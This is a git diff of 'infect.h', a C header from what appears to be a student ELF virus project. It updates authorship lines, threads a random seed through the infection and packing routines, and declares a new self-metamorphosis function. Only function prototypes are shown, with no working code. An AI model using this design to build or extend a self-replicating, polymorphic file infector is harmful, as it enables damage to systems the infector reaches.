@@ -3,10 +3,10 @@
 /*                                                        :::      ::::::::   */
 /*   infect.h                                           :+:      :+:    :+:   */
 /*                                                    +:+ +:+         +:+     */
-/*   By: jfortin <jfortin@student.42.fr>            +#+  +:+       +#+        */
+/*   By: agrumbac <agrumbac@student.42.fr>          +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2019/06/04 04:27:47 by agrumbac          #+#    #+#             */
-/*   Updated: 2019/06/15 17:17:38 by ichkamo          ###   ########.fr       */
+/*   Updated: 2019/12/13 09:12:01 by anselme          ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -64,14 +64,20 @@ bool	foreach_shdr(const struct safe_pointer info, f_iter_callback callback, void
 ** infect
 */
 
-bool		infect_if_candidate(const char *file);
-bool		elf64_packer(const struct famine food, size_t original_file_size);
+bool		infect_if_candidate(const char *file, uint64_t seed[2]);
+bool		elf64_packer(const struct famine food, size_t original_file_size, uint64_t seed[2]);
 bool		find_entry(struct entry *original_entry, struct safe_pointer info);
 bool		can_infect(const struct entry *original_entry, const struct safe_pointer info);
-bool		setup_payload(const struct entry *original_entry, const struct safe_pointer info);
+bool		setup_payload(const struct entry *original_entry, const struct safe_pointer info, uint64_t son_seed[2]);
 bool		adjust_references(const struct safe_pointer info, size_t shift_amount, const struct entry *original_entry);
 bool		copy_to_clone(const struct famine food, size_t end_last_sect, \
 			size_t shift_amount, size_t original_size);
+
+/*
+** polymorphism
+*/
+
+bool		metamorph_self();
 
 /*
 ** payload
